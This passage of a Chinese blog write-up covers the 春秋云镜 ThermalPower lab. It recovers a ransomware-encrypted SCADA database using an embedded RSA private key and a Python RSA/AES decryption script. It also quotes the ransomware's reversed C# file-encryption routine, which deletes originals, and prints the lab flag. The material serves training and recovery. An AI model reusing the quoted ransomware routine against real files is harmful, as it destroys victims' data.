KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>通过<a target="_blank" rel="noopener" href="https://www.lddgo.net/en/encrypt/rsa">工具</a>，对 <code>encryptedAesKey</code> 进行解密，得到 <code>AES_KEY</code>：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[base64]</span>  cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=<br><span class="hljs-string">[hex]</span>  <span class="hljs-number">7258</span>bd82a5e94eb9bb08f31c74ff534a6552cd756049bde3ad6f806a44bb6b39<br></code></pre></td></tr></table></figure>
+
+<p>这一步也可以编程实现，见下文。</p>
+<p><strong>AES解密</strong></p>
+<p>使用 <code>AES KEY</code> 对文件 <code>ScadaDB.sql.locky</code> 进行解密。</p>
+<p>RSA + AES 解密的完整脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author  : iker</span><br><span class="hljs-comment"># @Time    : 2024/03/04 16:10</span><br><span class="hljs-comment"># @Function: RSA Privatekey Decryption &amp; AES CBC Decryption</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5 <span class="hljs-keyword">as</span> Cipher_pkcs1_v1_5<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_decrypt</span>(<span class="hljs-params">data</span>):<br>    private_key = <span class="hljs-string">&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----</span><br><span class="hljs-string">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+</span><br><span class="hljs-string">PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3</span><br><span class="hljs-string">YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr</span><br><span class="hljs-string">rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17</span><br><span class="hljs-string">8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox</span><br><span class="hljs-string">RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN</span><br><span class="hljs-string">UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz</span><br><span class="hljs-string">J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ</span><br><span class="hljs-string">vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk</span><br><span class="hljs-string">Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/</span><br><span class="hljs-string">xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0</span><br><span class="hljs-string">VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd</span><br><span class="hljs-string">FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy</span><br><span class="hljs-string">PHvLZB6D8zSyuGw=</span><br><span class="hljs-string">-----END PRIVATE KEY-----&quot;&quot;&quot;</span><br>    data = base64.b64decode(data)<br>    priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key))<br>    decrypted_data = priobj.decrypt(data,<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> decrypted_data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># style(string) – Padding algorithm.It can be ‘pkcs7’ (default), ‘iso7816’ or ‘x923’.</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) % AES.block_size != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> pad(data, AES.block_size, <span class="hljs-string">&#x27;pkcs7&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_cbc_encrypt</span>(<span class="hljs-params">iv, key, data</span>):<br>    key = padding(key)<br>    data = padding(data)<br>    iv = padding(iv)<br><br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    cipher_data = aes.encrypt(data)<br>    <span class="hljs-keyword">return</span> cipher_data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_cbc_decrypt</span>(<span class="hljs-params">iv, key, data</span>):<br>    iv = padding(iv)<br>    key = padding(key)<br>    data = padding(data)<br><br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    data = aes.decrypt(data)<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_file</span>(<span class="hljs-params">encrypted_filepath,output_filepath,key</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(encrypted_filepath, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br><br>    iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span><br>    decryption_result = aes_cbc_decrypt(iv, key, data)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_filepath, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decryption_result)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    encryptedAesKey = <span class="hljs-string">&quot;lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=&quot;</span><br>    key = rsa_decrypt(encryptedAesKey)<br>    encrypted_filepath = <span class="hljs-string">&quot;ScadaDB.sql.locky&quot;</span><br>    output_filepath = <span class="hljs-string">&quot;ScadaDB.sql&quot;</span><br>    decrypt_file(encrypted_filepath,output_filepath,key)<br></code></pre></td></tr></table></figure>
+
+<p>解密后得到 <code>ScadaDB.sql</code>。</p>
+<p>也可以用cyberchef解密</p>
+<p>打开数据库文件，得到 flag04：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">63</span>cd8cd5-<span class="hljs-number">151</span>f-<span class="hljs-number">4</span>f29-bdc7-f80312888158&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>AES iv 补充说明</strong></p>
+<p>逆向勒索程序后，可以看到在 EncryptFile 函数中，先输出了长度为 16 字节的 iv，再输出了加密后的数据库文件，然后一起写入 <code>ScadaDB.sql.locky</code>：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">private <span class="hljs-type">void</span> EncryptFile(string inputFile, string outputFile)<br>&#123;<br>  <span class="hljs-keyword">using</span> (AesCryptoServiceProvider cryptoServiceProvider = <span class="hljs-built_in">new</span> AesCryptoServiceProvider())<br>  &#123;<br>    cryptoServiceProvider.Key = this.AES_KEY;<br>    cryptoServiceProvider.GenerateIV();<br>    <span class="hljs-keyword">using</span> (ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor())<br>    &#123;<br>      <span class="hljs-keyword">using</span> (FileStream fileStream1 = <span class="hljs-built_in">new</span> FileStream(inputFile, FileMode.<span class="hljs-keyword">Open</span>))<br>      &#123;<br>        <span class="hljs-keyword">using</span> (FileStream fileStream2 = <span class="hljs-built_in">new</span> FileStream(outputFile, FileMode.<span class="hljs-keyword">Create</span>))<br>        &#123;<br>          <span class="hljs-keyword">using</span> (CryptoStream destination = <span class="hljs-built_in">new</span> CryptoStream((Stream) fileStream2, encryptor, CryptoStreamMode.<span class="hljs-keyword">Write</span>))<br>          &#123;<br>            fileStream2.<span class="hljs-keyword">Write</span>(cryptoServiceProvider.IV, <span class="hljs-number">0</span>, cryptoServiceProvider.IV.Length);<br>            fileStream1.CopyTo((Stream) destination);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">System</span>.IO.File.<span class="hljs-keyword">Delete</span>(inputFile);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以 <code>ScadaDB.sql.locky</code> 的前 16 字节实际上是 iv：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">iv = <span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>B9<span class="hljs-char escape_">\x</span>3C<span class="hljs-char escape_">\x</span>62<span class="hljs-char escape_">\x</span>85<span class="hljs-char escape_">\x</span>21<span class="hljs-char escape_">\x</span>95<span class="hljs-char escape_">\x</span>39<span class="hljs-char escape_">\x</span>E5<span class="hljs-char escape_">\x</span>C5<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>5A<span class="hljs-char escape_">\x</span>AA<span class="hljs-char escape_">\x</span>3A<span class="hljs-char escape_">\x</span>B0<span class="hljs-char escape_">\x</span>BF<span class="hljs-char escape_">\x</span>6C&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是在本场景中，不影响解密，因为在解密时，错误的 iv 只影响明文块的第一个 16 字节 block，而在本场景中，前 16 字节恰好为 iv，不是原始 <code>ScadaDB.sql</code> 文件中的数据。</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13525">https://xz.aliyun.com/news/13525</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2025/03/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower/#%E7%AC%AC%E4%BA%8C%E5%85%B3">https://blog.potatowo.top/2025/03/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower/#%E7%AC%AC%E4%BA%8C%E5%85%B3</a></p>
+<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2024/03/01/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83-thermalpower/">https://fushuling.com/index.php/2024/03/01/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83-thermalpower/</a></p>
+<p><a target="_blank" rel="noopener" href="https://ta0.fun/posts/a5238ac2/">https://ta0.fun/posts/a5238ac2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://nekosec.github.io/2025/02/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower/">https://nekosec.github.io/2025/02/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="print-no-link">#春秋云镜</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜 ThermalPower</div>
+      <div>http://example.com/2026/test59/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test60/" title="春秋云镜 Flarum">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜 Flarum</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test58/" title="春秋云镜 Delivery">
+                        <span class="hidden-mobile">春秋云镜 Delivery</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
